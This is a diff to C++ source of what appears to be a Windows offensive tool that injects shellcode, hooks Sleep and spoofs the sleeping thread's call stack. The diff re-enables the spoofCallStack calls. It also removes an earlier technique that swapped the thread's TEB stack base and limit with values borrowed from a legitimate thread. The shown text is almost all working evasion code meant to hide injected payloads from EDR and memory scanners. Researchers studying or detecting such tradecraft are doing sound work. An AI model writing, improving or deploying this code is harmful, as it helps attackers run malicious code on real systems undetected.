@@ -11,30 +11,15 @@ void WINAPI MySleep(DWORD _dwMilliseconds)
     const volatile DWORD dwMilliseconds = _dwMilliseconds;
 
     // Perform this (current) thread call stack spoofing.
-    //spoofCallStack(true);
+    spoofCallStack(true);
 
     log("\n===> MySleep(", std::dec, dwMilliseconds, ")\n");
-
-    PULONG_PTR ptr = (PULONG_PTR)_AddressOfReturnAddress();
-    ptr--;
-
-
-    Start_Of_TEB* teb = (Start_Of_TEB*)NtCurrentTeb();
-    g_stackTraceSpoofing.origTebBaseLow = (ULONG_PTR)teb->StackBase;
-    g_stackTraceSpoofing.origTebBaseHigh = (ULONG_PTR)teb->StackLimit;
-
-    teb->StackBase = (void*)g_stackTraceSpoofing.legitTebBaseLow;
-    teb->StackLimit = (void*)g_stackTraceSpoofing.legitTebBaseHigh;
 
     // Perform sleep emulating originally hooked functionality.
     ::SleepEx(dwMilliseconds, false);
 
-
-    teb->StackBase = (void*)g_stackTraceSpoofing.origTebBaseLow;
-    teb->StackLimit = (void*)g_stackTraceSpoofing.origTebBaseHigh;
- 
     // Restore original thread's call stack.
-    //spoofCallStack(false);
+    spoofCallStack(false);
 }
 
 bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers /*= NULL*/)
@@ -461,36 +446,6 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
     return (NULL != thread.get());
 }
 
-
-void WINAPI _acquireLegitimateThreadStack(LPVOID param)
-{
-    Start_Of_TEB* teb = (Start_Of_TEB*)NtCurrentTeb();
-    g_stackTraceSpoofing.legitTebBaseLow = (ULONG_PTR)teb->StackBase;
-    g_stackTraceSpoofing.legitTebBaseHigh = (ULONG_PTR)teb->StackLimit;
-
-    ::SleepEx(INFINITE, false);
-}
-
-bool acquireLegitimateThreadStack()
-{
-    CallStackFrame frames[MaxStackFramesToSpoof] = { 0 };
-    size_t numOfFrames = 0;
-
-    HandlePtr secondThread(::CreateThread(
-        NULL,
-        0,
-        //(LPTHREAD_START_ROUTINE)::Sleep,
-        (LPTHREAD_START_ROUTINE)_acquireLegitimateThreadStack,
-        (LPVOID)INFINITE,
-        0,
-        0
-    ), &::CloseHandle);
-
-    Sleep(1000);
-
-    return true;
-}
-
 int main(int argc, char** argv)
 {
     if (argc < 3)
@@ -515,12 +470,6 @@ int main(int argc, char** argv)
         if (!initStackSpoofing())
         {
             log("[!] Could not initialize stack spoofing!");
-            return 1;
-        }
-
-        if (!acquireLegitimateThreadStack())
-        {
-            log("[!] Could not acquire legitimate thread's stack.");
             return 1;
         }
 
